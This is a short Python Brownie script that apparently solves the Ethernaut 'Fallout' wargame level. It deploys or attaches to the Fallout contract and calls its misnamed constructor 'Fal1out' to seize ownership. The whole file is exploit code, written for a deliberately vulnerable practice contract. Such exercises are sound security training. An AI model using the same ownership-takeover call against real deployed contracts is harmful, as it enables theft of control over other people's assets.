from brownie import Fallout, network, Contract, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        fallout = Fallout.deploy({"from": get_account(index=1)})

    else:

        web3 = Web3(
            config["networks"][network.show_active()]["infura"]
        )

        fallout = Contract.from_abi(
            Fallout._name,
            config["networks"][network.show_active()]["fallout"],
            Fallout.abi,
        )

    fallout.Fal1out({"from": account}).wait(1)  # Constructor is misnamed.
    print(f"Fallout owner is {fallout.owner()}")


def main():
    attack()
